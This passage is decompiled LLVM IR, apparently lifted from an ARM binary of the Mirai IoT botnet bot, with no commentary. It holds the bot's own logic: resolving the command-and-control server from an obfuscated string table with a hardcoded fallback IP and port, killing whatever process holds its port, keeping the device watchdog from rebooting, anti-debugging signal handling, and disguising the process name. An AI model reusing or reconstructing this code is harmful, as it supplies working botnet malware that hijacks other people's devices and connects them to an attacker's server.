  %v1_d70c = add i32 %v0_d70c, -1
  store i32 %v1_d70c, i32* %r1.global-to-local, align 4
  %v2_d70c = icmp eq i32 %v0_d70c, 0
  br i1 %v2_d70c, label %dec_label_pc_d61c, label %dec_label_pc_d714

dec_label_pc_d714:                                ; preds = %dec_label_pc_d70c.backedge, %dec_label_pc_d714.lr.ph
  %v0_d70c = phi i32 [ %v1_d70c101, %dec_label_pc_d714.lr.ph ], [ %v1_d70c, %dec_label_pc_d70c.backedge ]
  %storemerge146.in = phi i32 [ 0, %dec_label_pc_d714.lr.ph ], [ %storemerge146, %dec_label_pc_d70c.backedge ]
  %v1_d714 = phi i32 [ 0, %dec_label_pc_d714.lr.ph ], [ %v1_d714178, %dec_label_pc_d70c.backedge ]
  %v2_d714 = add i32 %v1_d714, %v0_d714.pre
  %v3_d714 = inttoptr i32 %v2_d714 to i8*
  %v4_d714 = load i8, i8* %v3_d714, align 1
  %v6_d714 = zext i8 %v4_d714 to i32
  store i32 %v6_d714, i32* %r2.global-to-local, align 4
  %v2_d718 = add i32 %storemerge146.in, %v1_d718.pre
  %v3_d718 = inttoptr i32 %v2_d718 to i8*
  %v4_d718 = load i8, i8* %v3_d718, align 1
  %v6_d718 = zext i8 %v4_d718 to i32
  store i32 %v6_d718, i32* %r3.global-to-local, align 4
  %v9_d71c = icmp eq i8 %v4_d718, %v4_d714
  br i1 %v9_d71c, label %dec_label_pc_d6fc, label %dec_label_pc_d728

dec_label_pc_d728:                                ; preds = %dec_label_pc_d714
  br label %dec_label_pc_d70c.backedge

dec_label_pc_d730:                                ; preds = %dec_label_pc_d748
  %v1_d730 = add i32 %v1_d74c, 1
  store i32 %v1_d730, i32* @lr, align 4
  %v9_d734 = icmp eq i32 %v3_d620, %v1_d730
  br i1 %v9_d734, label %dec_label_pc_d7ac, label %dec_label_pc_d740.backedge

dec_label_pc_d740.backedge:                       ; preds = %dec_label_pc_d730, %dec_label_pc_d760
  %v1_d74c186 = phi i32 [ 0, %dec_label_pc_d760 ], [ %v1_d730, %dec_label_pc_d730 ]
  %storemerge145 = add i32 %storemerge145.in, 1
  %v1_d740 = add i32 %v0_d740, -1
  store i32 %v1_d740, i32* %r1.global-to-local, align 4
  %v2_d740 = icmp eq i32 %v0_d740, 0
  br i1 %v2_d740, label %dec_label_pc_d638, label %dec_label_pc_d748

dec_label_pc_d748:                                ; preds = %dec_label_pc_d740.backedge, %dec_label_pc_d748.lr.ph
  %v0_d740 = phi i32 [ %v1_d740110, %dec_label_pc_d748.lr.ph ], [ %v1_d740, %dec_label_pc_d740.backedge ]
  %storemerge145.in = phi i32 [ 0, %dec_label_pc_d748.lr.ph ], [ %storemerge145, %dec_label_pc_d740.backedge ]
  %v1_d74c = phi i32 [ 0, %dec_label_pc_d748.lr.ph ], [ %v1_d74c186, %dec_label_pc_d740.backedge ]
  store i32 %v3_d57c, i32* %r3.global-to-local, align 4
  %v2_d74c = add i32 %v1_d74c, %v3_d57c
  %v3_d74c = inttoptr i32 %v2_d74c to i8*
  %v4_d74c = load i8, i8* %v3_d74c, align 1
  %v6_d74c = zext i8 %v4_d74c to i32
  store i32 %v6_d74c, i32* %r2.global-to-local, align 4
  %v2_d750 = add i32 %storemerge145.in, %v1_d750.pre
  %v3_d750 = inttoptr i32 %v2_d750 to i8*
  %v4_d750 = load i8, i8* %v3_d750, align 1
  %v6_d750 = zext i8 %v4_d750 to i32
  store i32 %v6_d750, i32* @r3, align 4
  %v9_d754 = icmp eq i8 %v4_d750, %v4_d74c
  br i1 %v9_d754, label %dec_label_pc_d730, label %dec_label_pc_d760

dec_label_pc_d760:                                ; preds = %dec_label_pc_d748
  br label %dec_label_pc_d740.backedge

dec_label_pc_d768:                                ; preds = %dec_label_pc_d780
  %v1_d768 = add i32 %v1_d784, 1
  store i32 %v1_d768, i32* @lr, align 4
  %v9_d76c = icmp eq i32 %v3_d63c, %v1_d768
  br i1 %v9_d76c, label %dec_label_pc_d7ac, label %dec_label_pc_d778.backedge

dec_label_pc_d778.backedge:                       ; preds = %dec_label_pc_d768, %dec_label_pc_d798
  %v1_d784194 = phi i32 [ 0, %dec_label_pc_d798 ], [ %v1_d768, %dec_label_pc_d768 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_d778 = add i32 %v0_d778, -1
  store i32 %v1_d778, i32* %r1.global-to-local, align 4
  %v2_d778 = icmp eq i32 %v0_d778, 0
  br i1 %v2_d778, label %dec_label_pc_d654, label %dec_label_pc_d780

dec_label_pc_d780:                                ; preds = %dec_label_pc_d778.backedge, %dec_label_pc_d780.lr.ph
  %v0_d778 = phi i32 [ %v1_d778119, %dec_label_pc_d780.lr.ph ], [ %v1_d778, %dec_label_pc_d778.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_d780.lr.ph ], [ %storemerge, %dec_label_pc_d778.backedge ]
  %v1_d784 = phi i32 [ 0, %dec_label_pc_d780.lr.ph ], [ %v1_d784194, %dec_label_pc_d778.backedge ]
  store i32 %v3_d590, i32* %r3.global-to-local, align 4
  %v2_d784 = add i32 %v1_d784, %v3_d590
  %v3_d784 = inttoptr i32 %v2_d784 to i8*
  %v4_d784 = load i8, i8* %v3_d784, align 1
  %v6_d784 = zext i8 %v4_d784 to i32
  store i32 %v6_d784, i32* %r2.global-to-local, align 4
  %v2_d788 = add i32 %storemerge.in, %v1_d788.pre
  %v3_d788 = inttoptr i32 %v2_d788 to i8*
  %v4_d788 = load i8, i8* %v3_d788, align 1
  %v6_d788 = zext i8 %v4_d788 to i32
  store i32 %v6_d788, i32* @r3, align 4
  %v9_d78c = icmp eq i8 %v4_d788, %v4_d784
  br i1 %v9_d78c, label %dec_label_pc_d768, label %dec_label_pc_d798

dec_label_pc_d798:                                ; preds = %dec_label_pc_d780
  br label %dec_label_pc_d778.backedge

dec_label_pc_d7a0:                                ; preds = %dec_label_pc_d674
  %v1_d7a0 = add i32 %v1_d678, 1
  %v9_d7a4 = icmp eq i32 %v3_d658, %v1_d7a0
  br i1 %v9_d7a4, label %dec_label_pc_d7ac, label %dec_label_pc_d68c

dec_label_pc_d7ac:                                ; preds = %dec_label_pc_d694, %dec_label_pc_d6c8, %dec_label_pc_d6fc, %dec_label_pc_d730, %dec_label_pc_d768, %dec_label_pc_d7a0
  %v1_d7b0 = call i32 @table_lock_val(i32 20)
  %v1_d7b8 = call i32 @table_lock_val(i32 21)
  %v1_d7c0 = call i32 @table_lock_val(i32 22)
  %v1_d7c8 = call i32 @table_lock_val(i32 23)
  %v1_d7d0 = call i32 @table_lock_val(i32 24)
  %v1_d7d8 = call i32 @table_lock_val(i32 36)
  %v1_d7e0 = call i32 @__GI___libc_close(i32 %v2_d4f4)
  %v0_d7e4 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d7ec = call i32 @kill(i32 %v0_d7e4, i32 9)
  br label %dec_label_pc_d7f0

dec_label_pc_d7f0:                                ; preds = %dec_label_pc_d4ec, %dec_label_pc_d820, %dec_label_pc_d7ac
  store i32 %v2_d378, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d7f8 = call i32 @util_zero()
  store i32 %v2_d3c8, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d808 = call i32 @util_zero()
  %v1_d810 = call i32 @sleep(i32 1)
  store i32 %v2_d350, i32* @r4, align 4
  %v0_d818 = load i32, i32* @r7, align 4
  store i32 %v0_d818, i32* @r5, align 4
  br label %dec_label_pc_d2a0.backedge

dec_label_pc_d820:                                ; preds = %dec_label_pc_d5b0.backedge, %dec_label_pc_d504
  %v1_d824 = call i32 @table_lock_val(i32 20)
  %v1_d82c = call i32 @table_lock_val(i32 21)
  %v1_d834 = call i32 @table_lock_val(i32 22)
  %v1_d83c = call i32 @table_lock_val(i32 23)
  %v1_d844 = call i32 @table_lock_val(i32 24)
  %v1_d84c = call i32 @table_lock_val(i32 36)
  %v1_d854 = call i32 @__GI___libc_close(i32 %v2_d4f4)
  br label %dec_label_pc_d7f0

; uselistorder directives
  uselistorder i32 %v1_d7a0, { 1, 0 }
  uselistorder i32 %v1_d68c, { 1, 0 }
  uselistorder i32 %v1_d678, { 1, 0 }
  uselistorder i32 %v0_d68c, { 1, 0 }
  uselistorder i32 %v1_d5bc, { 1, 0 }
  uselistorder i32 %v2_d4f4, { 3, 2, 4, 1, 0 }
  uselistorder i1 %v7_d4d0, { 1, 0 }
  uselistorder i32 %v2_d4cc, { 1, 0 }
  uselistorder i32 %v2_d2a4, { 1, 0 }
  uselistorder i32 %stack_var_-8436.1.be, { 1, 0 }
  uselistorder i32 %v3_d424, { 1, 2, 0 }
  uselistorder i32 %v2_d334, { 1, 0 }
  uselistorder i32 %v1_d2d4, { 0, 1, 5, 4, 3, 2, 6, 8, 9, 7 }
  uselistorder i32 %v1_d2b0, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-8436.0, { 1, 0 }
  uselistorder i32 %v2_d5ac, { 1, 0, 2 }
  uselistorder i32 %v2_d3c8, { 1, 0, 2 }
  uselistorder i32 %v3_d248, { 1, 0 }
  uselistorder i32 %v2_d214, { 2, 0, 1 }
  uselistorder i32 %v3_d1c0, { 1, 0 }
  uselistorder i32 %v1_d1b0, { 3, 2, 0, 4, 6, 5, 7, 8, 9, 1, 10, 11, 12 }
  uselistorder i32 %v3_d130, { 1, 2, 0 }
  uselistorder i32 %v3_d0f0, { 1, 2, 0 }
  uselistorder i32 %v3_d0a0, { 1, 2, 0 }
  uselistorder i32 %v3_d054, { 2, 1, 0 }
  uselistorder i32 %v3_d01c, { 1, 2, 0 }
  uselistorder i32 %v3_cfc8, { 1, 2, 0 }
  uselistorder i32 %storemerge212, { 1, 0 }
  uselistorder i32 %v0_cf54, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-80, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-56, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 6, 7, 8, 9, 10, 12, 11, 2, 0, 1, 5, 4, 13, 3, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_24f84.79, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_24f88.71, { 0, 2, 1 }
  uselistorder label %dec_label_pc_d7f0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d7ac, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_d778.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d740.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d70c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d6d8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d6a4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d68c, { 1, 0 }
  uselistorder label %dec_label_pc_d5c8, { 1, 0 }
  uselistorder label %dec_label_pc_d4ec, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_d2a0.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_d480, { 1, 0 }
  uselistorder label %dec_label_pc_d2b0, { 1, 0 }
  uselistorder label %dec_label_pc_d2b0.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_d15c, { 1, 0 }
  uselistorder label %dec_label_pc_d11c, { 1, 0 }
  uselistorder label %dec_label_pc_d0cc, { 1, 0 }
  uselistorder label %dec_label_pc_d080, { 1, 0 }
  uselistorder label %dec_label_pc_d048, { 1, 0 }
  uselistorder label %dec_label_pc_cff4, { 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_d9e4.84 to i32), i32* @global_var_222f4.86, align 4
  ret i32 %arg1
}

define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_d884 = load i32, i32* @r6, align 4
  %v12_d884 = load i32, i32* @r7, align 4
  %v15_d884 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_d8a0 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_222ec.88 to i32), i32* @r6, align 4
  %v7_d8a8 = icmp eq i32 %v3_d8a0, -1
  store i32 %v3_d8a0, i32* @global_var_222ec.88, align 4
  br i1 %v7_d8a8, label %dec_label_pc_d960, label %dec_label_pc_d8b4

dec_label_pc_d8b4:                                ; preds = %entry
  %v2_d8b4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_d8b4, i32* @r3, align 4
  %v0_d8b8 = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v5_d8c8 = call i32 @__GI_setsockopt(i32 %v3_d8a0, i32 %v0_d8b8, i32 2, i32 %v2_d8b4, i32 4)
  %v2_d8cc = load i32, i32* @global_var_222ec.88, align 4
  store i32 %v2_d8cc, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_d8dc = call i32 @__libc_fcntl(i32 %v2_d8cc, i32 3)
  %v0_d8e0 = load i32, i32* @r5, align 4
  %v1_d8e4 = or i32 %v2_d8dc, 2048
  store i32 %v1_d8e4, i32* @r2, align 4
  %v0_d8e8 = load i32, i32* @r4, align 4
  %v2_d8ec = call i32 @__libc_fcntl(i32 %v0_d8e8, i32 %v0_d8e0)
  store i32 ptrtoint (i8** @global_var_222f8.90 to i32), i32* @r8, align 4
  %v2_d8f4 = load i8, i8* bitcast (i8** @global_var_222f8.90 to i8*), align 4
  %v2_d8f8 = icmp eq i8 %v2_d8f4, 0
  br i1 %v2_d8f8, label %.thread2, label %bb

.thread2:                                         ; preds = %dec_label_pc_d8b4
  br label %bb20

bb:                                               ; preds = %dec_label_pc_d8b4
  br label %bb20

bb20:                                             ; preds = %.thread2, %bb
  %v0_d91c = call i32 @__GI___errno_location()
  store i32 0, i32* @r7, align 4
  %v2_d924 = inttoptr i32 %v0_d91c to i32*
  store i32 0, i32* %v2_d924, align 4
  %v2_d928 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d928, i32* @r5, align 4
  store i32 %v0_d91c, i32* %r4.global-to-local, align 4
  %v2_d938 = load i32, i32* @global_var_222ec.88, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d944 = call i32 @bind(i32 %v2_d938, i32 %v2_d928, i32 16)
  %v7_d948 = icmp eq i32 %v3_d944, -1
  br i1 %v7_d948, label %dec_label_pc_d96c, label %dec_label_pc_d950

dec_label_pc_d950:                                ; preds = %bb20
  %v2_d958 = load i32, i32* @global_var_222ec.88, align 4
  %v2_d95c = call i32 @listen(i32 %v2_d958, i32 1)
  br label %dec_label_pc_d960

dec_label_pc_d960:                                ; preds = %entry, %dec_label_pc_d978, %dec_label_pc_d950
  %v1_d968 = phi i32 [ %v3_d8a0, %entry ], [ %v1_d9bc, %dec_label_pc_d978 ], [ %v2_d95c, %dec_label_pc_d950 ]
  store i32 %v9_d884, i32* @r6, align 4
  store i32 %v12_d884, i32* @r7, align 4
  store i32 %v15_d884, i32* @r8, align 4
  ret i32 %v1_d968

dec_label_pc_d96c:                                ; preds = %bb20
  %v0_d96c = load i32, i32* %r4.global-to-local, align 4
  %v1_d96c = inttoptr i32 %v0_d96c to i32*
  %v2_d96c = load i32, i32* %v1_d96c, align 4
  %v7_d970 = icmp eq i32 %v2_d96c, 99
  br i1 %v7_d970, label %dec_label_pc_d9c4, label %dec_label_pc_d978

dec_label_pc_d978:                                ; preds = %dec_label_pc_d9c4, %bb21, %dec_label_pc_d96c
  store i32 15290, i32* @r4, align 4
  %v2_d990 = load i32, i32* @global_var_222ec.88, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d9a0 = call i32 @__libc_connect(i32 %v2_d990, i32 %v2_d928, i32 16)
  %v1_d9a8 = call i32 @sleep(i32 5)
  %v2_d9ac = load i32, i32* @global_var_222ec.88, align 4
  %v1_d9b0 = call i32 @__GI___libc_close(i32 %v2_d9ac)
  %v0_d9b4 = load i32, i32* @r4, align 4
  %v1_d9b8 = call i32 @killer_kill_by_port(i32 %v0_d9b4)
  %v1_d9bc = call i32 @ensure_single_instance(i32 %v1_d9b8)
  br label %dec_label_pc_d960

dec_label_pc_d9c4:                                ; preds = %dec_label_pc_d96c
  %v2_d9c4 = load i8, i8* bitcast (i8** @global_var_222f8.90 to i8*), align 4
  %v3_d9c4 = zext i8 %v2_d9c4 to i32
  %v1_d9c8 = load i32, i32* @r7, align 4
  %v9_d9c8 = icmp eq i32 %v3_d9c4, %v1_d9c8
  br i1 %v9_d9c8, label %dec_label_pc_d978, label %bb21

bb21:                                             ; preds = %dec_label_pc_d9c4
  %v2_d9d0 = trunc i32 %v1_d9c8 to i8
  store i8 %v2_d9d0, i8* bitcast (i8** @global_var_222f8.90 to i8*), align 4
  br label %dec_label_pc_d978

; uselistorder directives
  uselistorder i32 %v2_d928, { 1, 0, 2 }
  uselistorder i32 %v3_d8a0, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 (i32)* @killer_kill_by_port, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @listen, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bind, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_222f8.90 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_222f8.90, { 1, 0 }
  uselistorder label %dec_label_pc_d978, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d960, { 1, 2, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @resolve_cnc_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v1_d9ec = call i32 @table_unlock_val(i32 2)
  %v3_d9f8 = call i32 @table_retrieve_val(i32 2, i32* null)
  %v1_d9fc = call i32 @resolv_lookup(i32 %v3_d9f8)
  store i32 %v1_d9fc, i32* @r6, align 4
  %v1_da08 = call i32 @table_lock_val(i32 2)
  %v0_da0c = load i32, i32* @r6, align 4
  %v2_da0c = icmp eq i32 %v0_da0c, 0
  br i1 %v2_da0c, label %dec_label_pc_da5c, label %dec_label_pc_da14

dec_label_pc_da14:                                ; preds = %entry
  %v1_da14 = add i32 %v0_da0c, 4
  %v2_da14 = inttoptr i32 %v1_da14 to i32*
  %v3_da14 = load i32, i32* %v2_da14, align 4
  store i32 %v3_da14, i32* @r4, align 4
  %v0_da18 = call i32 @rand_next()
  %v0_da1c = load i32, i32* @r6, align 4
  %v1_da1c = inttoptr i32 %v0_da1c to i8*
  %v2_da1c = load i8, i8* %v1_da1c, align 1
  %v3_da1c = zext i8 %v2_da1c to i32
  %v3_da20 = urem i32 %v0_da18, %v3_da1c
  store i32 ptrtoint (i16** @global_var_24f8c.93 to i32), i32* @r5, align 4
  %v0_da28 = load i32, i32* @r4, align 4
  %v4_da28 = mul nuw nsw i32 %v3_da20, 4
  %v5_da28 = add i32 %v0_da28, %v4_da28
  %v6_da28 = inttoptr i32 %v5_da28 to i32*
  %v7_da28 = load i32, i32* %v6_da28, align 4
  store i32 %v7_da28, i32* @global_var_24f90.94, align 4
  %v1_da34 = call i32 @resolv_entries_free(i32 %v0_da1c)
  %v1_da3c = call i32 @table_unlock_val(i32 1)
  %v3_da48 = call i32 @table_retrieve_val(i32 1, i32* null)
  %v4_da48 = inttoptr i32 %v3_da48 to i16*
  %v3_da4c = load i16, i16* %v4_da48, align 2
  store i16 %v3_da4c, i16* bitcast (i32* @global_var_24f8e.95 to i16*), align 4
  %v1_da58 = call i32 @table_lock_val(i32 1)
  br label %dec_label_pc_da5c

dec_label_pc_da5c:                                ; preds = %entry, %dec_label_pc_da14
  %v1_da60 = phi i32 [ %v1_da08, %entry ], [ %v1_da58, %dec_label_pc_da14 ]
  ret i32 %v1_da60

; uselistorder directives
  uselistorder label %dec_label_pc_da5c, { 1, 0 }
}

define i32 @watchdog_maintain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_da68 = load i32, i32* @r4, align 4
  %v6_da68 = load i32, i32* @r5, align 4
  %v0_da70 = call i32 @__libc_fork()
  %v7_da74 = icmp eq i32 %v0_da70, -1
  %. = zext i1 %v7_da74 to i32
  %tmp11 = icmp slt i32 %v0_da70, 1
  %storemerge4 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_da90 = icmp eq i32 %storemerge4, 0
  store i32 %v0_da70, i32* @global_var_2246c.97, align 4
  br i1 %v2_da90, label %dec_label_pc_daa8, label %dec_label_pc_da9c

dec_label_pc_da9c:                                ; preds = %entry
  store i32 %v3_da68, i32* @r4, align 4
  store i32 %v6_da68, i32* @r5, align 4
  ret i32 %v0_da70

dec_label_pc_daa8:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_dab4 = call i32 @table_unlock_val(i32 28)
  %v1_dabc = call i32 @table_unlock_val(i32 29)
  %v0_dac0 = load i32, i32* @r5, align 4
  %v2_dac8 = inttoptr i32 %v0_dac0 to i32*
  %v3_dac8 = call i32 @table_retrieve_val(i32 28, i32* %v2_dac8)
  %v2_dad0 = call i32 @__libc_open(i32 %v3_dac8, i32 2)
  %v7_dad4 = icmp eq i32 %v2_dad0, -1
  store i32 %v2_dad0, i32* @r4, align 4
  br i1 %v7_dad4, label %dec_label_pc_db1c, label %dec_label_pc_dae0

dec_label_pc_dae0:                                ; preds = %dec_label_pc_db1c, %dec_label_pc_daa8
  %v0_daec = phi i32 [ %v2_db2c, %dec_label_pc_db1c ], [ %v2_dad0, %dec_label_pc_daa8 ]
  %v2_daf0 = ptrtoint i32* %stack_var_-20 to i32
  %v3_daf4 = call i32 @ioctl(i32 %v0_daec, i32 -2147199228, i32 %v2_daf0)
  br label %dec_label_pc_daf8

dec_label_pc_daf8:                                ; preds = %dec_label_pc_daf8, %dec_label_pc_dae0
  %v0_db04 = load i32, i32* @r4, align 4
  %v3_db0c = call i32 @ioctl(i32 %v0_db04, i32 -2147199227, i32 0)
  %v1_db14 = call i32 @sleep(i32 10)
  br label %dec_label_pc_daf8

dec_label_pc_db1c:                                ; preds = %dec_label_pc_daa8
  %v0_db1c = load i32, i32* @r5, align 4
  %v2_db24 = inttoptr i32 %v0_db1c to i32*
  %v3_db24 = call i32 @table_retrieve_val(i32 29, i32* %v2_db24)
  %v2_db2c = call i32 @__libc_open(i32 %v3_db24, i32 2)
  %v3_db30 = icmp eq i32 %v2_db2c, -1
  store i32 %v2_db2c, i32* @r4, align 4
  br i1 %v3_db30, label %dec_label_pc_db3c, label %dec_label_pc_dae0

dec_label_pc_db3c:                                ; preds = %dec_label_pc_db1c
  %v1_db40 = call i32 @table_lock_val(i32 28)
  %v1_db48 = call i32 @table_lock_val(i32 29)
  %v0_db4c = load i32, i32* @r5, align 4
  %v1_db50 = call i32 @__GI_exit(i32 %v0_db4c)
  %v0_db54 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_db54, label %bb14, label %bb15

bb14:                                             ; preds = %dec_label_pc_db3c
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_db3c, %bb14
  ret i32 %v1_db50

; uselistorder directives
  uselistorder i32 %v2_db2c, { 1, 2, 0 }
  uselistorder i32 %v2_dad0, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_da70, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_db68 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_db68, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_db80 = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  %v2_db8c = call i32 @__GI_sigaddset(i32 %v2_db68, i32 2)
  %v0_db90 = load i32, i32* @r5, align 4
  store i32 %v0_db90, i32* %r2.global-to-local, align 4
  %v4_db9c = call i32 @__GI_sigprocmask(i32 %v0_db90, i32* nonnull %stack_var_-64, i32 %v0_db90)
  %v2_dba8 = call i32 @bsd_signal(i32 17, i32 1)
  %v2_dbb4 = call i32 @bsd_signal(i32 5, i32 55404)
  %v0_dbb8 = call i32 @util_local_addr()
  store i32 ptrtoint (i16** @global_var_24f8c.93 to i32), i32* %r2.global-to-local, align 4
  store i16 -6144, i16* bitcast (i32* @global_var_24f8e.95 to i16*), align 4
  store i32 1494907823, i32* @global_var_24f90.94, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_dbb8, i32* @global_var_24f80.59, align 4
  store i16 2, i16* bitcast (i16** @global_var_24f8c.93 to i16*), align 4
  %v6_dbe0 = call i32 @table_init(i32 %v0_dbb8, i32 ptrtoint (i32* @global_var_24f80.59 to i32), i32 ptrtoint (i16** @global_var_24f8c.93 to i32), i32 2)
  store i32 ptrtoint (i32* @global_var_d9e4.84 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_222f4.86 to i32), i32* %ip.global-to-local, align 4
  %v2_dbec = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_dbec, i32* @sb, align 4
  store i32 ptrtoint (i32* @global_var_d9e4.84 to i32), i32* @global_var_222f4.86, align 4
  %v1_dbf4 = call i32 @ensure_single_instance(i32 %v6_dbe0)
  %v1_dbf8 = call i32 @rand_init(i32 %v1_dbf4)
  store i32 %v2_dbec, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_dc04 = call i32 @util_zero()
  %v0_dc08 = load i32, i32* @r6, align 4
  %v7_dc08 = icmp eq i32 %v0_dc08, 2
  br i1 %v7_dc08, label %dec_label_pc_dd38, label %dec_label_pc_dc10

dec_label_pc_dc10:                                ; preds = %dec_label_pc_dd38, %entry, %dec_label_pc_dd48
  %v0_dc10 = call i32 @rand_next()
  store i32 %v0_dc10, i32* @r6, align 4
  %v0_dc18 = load i32, i32* @r8, align 4
  %v1_dc18 = inttoptr i32 %v0_dc18 to i32*
  %v2_dc18 = load i32, i32* %v1_dc18, align 4
  %v1_dc1c = inttoptr i32 %v2_dc18 to i8*
  %v2_dc1c = call i32 @util_strlen(i8* %v1_dc1c)
  %v0_dc24 = load i32, i32* @r8, align 4
  %v1_dc24 = inttoptr i32 %v0_dc24 to i32*
  %v2_dc24 = load i32, i32* %v1_dc24, align 4
  %v1_dc28 = inttoptr i32 %v2_dc24 to i8*
  %v2_dc28 = call i32 @util_strlen(i8* %v1_dc28)
  %v1_dc2c = sub i32 20, %v2_dc1c
  %v0_dc34 = load i32, i32* @r6, align 4
  %v3_dc38 = urem i32 %v0_dc34, %v1_dc2c
  %v2_dc3c = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_dc3c, i32* @r5, align 4
  %v2_dc40 = add i32 %v3_dc38, %v2_dc28
  store i32 %v2_dc40, i32* @r4, align 4
  %v2_dc4c = call i32 @rand_alpha_str(i32 %v2_dc3c, i32 %v2_dc40)
  %v2_dc50 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_dc50, i32* @lr, align 4
  %v1_dc54 = load i32, i32* @r4, align 4
  %v2_dc54 = add i32 %v1_dc54, %v2_dc50
  store i32 %v2_dc54, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v0_dc60 = load i32, i32* @r8, align 4
  %v1_dc60 = inttoptr i32 %v0_dc60 to i32*
  %v2_dc60 = load i32, i32* %v1_dc60, align 4
  store i32 %v2_dc60, i32* @r0, align 4
  %v3_dc64 = add i32 %v2_dc54, -80
  %v4_dc64 = inttoptr i32 %v3_dc64 to i8*
  store i8 0, i8* %v4_dc64, align 1
  %v2_dc68 = inttoptr i32 %v2_dc60 to i8*
